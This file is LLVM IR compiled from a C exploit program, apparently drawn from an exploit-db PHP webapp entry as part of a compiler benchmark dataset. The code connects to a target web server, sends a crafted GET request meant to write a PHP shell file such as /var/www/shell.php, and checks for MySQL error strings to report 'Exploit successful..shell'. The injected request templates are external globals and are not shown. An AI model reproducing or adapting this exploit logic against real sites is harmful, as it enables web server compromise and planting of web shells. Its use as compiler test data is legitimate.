; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_8181.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_8181.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [26 x i8] c"Usage: %s host path file\0A\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"RunEx: %s localhost /cms /var/www/shell.php\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [31 x i8] c"connection refused..try again\0A\00", align 1
@Exec = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [4 x i8] c"%23\00", align 1
@GET = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [19 x i8] c"data sent error..\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"MySQL\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"mysql_fetch_array\00", align 1
@.str.7 = private unnamed_addr constant [24 x i8] c"Exploit unsuccessful..\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"Exploit successful..shell: %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1024 x i8], align 16
  %9 = alloca [1024 x i8], align 16
  %10 = alloca [500 x i8], align 16
  %11 = alloca [500 x i8], align 16
  %12 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %13, 3
  br i1 %14, label %15, label %25

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i8* %18)
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 0) #3
  unreachable

25:                                               ; preds = %2
  %26 = load i32, i32* @AF_INET, align 4
  %27 = load i32, i32* @SOCK_STREAM, align 4
  %28 = call i32 @socket(i32 %26, i32 %27, i32 0)
  store i32 %28, i32* %6, align 4
  %29 = load i32, i32* @AF_INET, align 4
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %29, i32* %30, align 4
  %31 = call i32 @htons(i32 80)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  store i32 %31, i32* %32, align 4
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @getHost(i8* %35)
  %37 = call i32 @inet_addr(i32 %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %39 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %38, i32 0, i32 0
  store i32 %37, i32* %39, align 4
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 12)
  store i32 %42, i32* %7, align 4
  %43 = load i32, i32* %7, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %48

45:                                               ; preds = %25
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0))
  %47 = call i32 @exit(i32 0) #3
  unreachable

48:                                               ; preds = %25
  %49 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 0
  %50 = load i8*, i8** @Exec, align 8
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 3
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %49, i32 500, i8* %50, i8* %53)
  %55 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 0
  %56 = call i32 @strncat(i8* %55, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i32 500)
  %57 = getelementptr inbounds [500 x i8], [500 x i8]* %10, i64 0, i64 0
  %58 = load i8*, i8** @GET, align 8
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 2
  %61 = load i8*, i8** %60, align 8
  %62 = getelementptr inbounds [500 x i8], [500 x i8]* %11, i64 0, i64 0
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 1
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %57, i32 500, i8* %58, i8* %61, i8* %62, i8* %65)
  %67 = load i32, i32* %6, align 4
  %68 = getelementptr inbounds [500 x i8], [500 x i8]* %10, i64 0, i64 0
  %69 = call i64 @send(i32 %67, i8* %68, i32 500, i32 0)
  %70 = icmp slt i64 %69, 0
  br i1 %70, label %71, label %73

71:                                               ; preds = %48
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  br label %73

73:                                               ; preds = %71, %48
  br label %74

74:                                               ; preds = %73
  %75 = load i32, i32* %6, align 4
  %76 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %77 = call i64 @recv(i32 %75, i8* %76, i32 1024, i32 0)
  %78 = icmp sgt i64 %77, 0
  br i1 %78, label %79, label %94

79:                                               ; preds = %74
  %80 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %81 = call i64 @strstr(i8* %80, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  %82 = icmp ne i64 %81, 0
  br i1 %82, label %87, label %83

83:                                               ; preds = %79
  %84 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %85 = call i64 @strstr(i8* %84, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0))
  %86 = icmp ne i64 %85, 0
  br i1 %86, label %87, label %89

87:                                               ; preds = %83, %79
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0))
  br label %94

89:                                               ; preds = %83
  %90 = load i8**, i8*** %5, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 3
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0), i8* %92)
  br label %94

94:                                               ; preds = %89, %87, %74
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i32) #1

declare dso_local i32 @getHost(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, ...) #1

declare dso_local i32 @strncat(i8*, i8*, i32) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i64 @recv(i32, i8*, i32, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
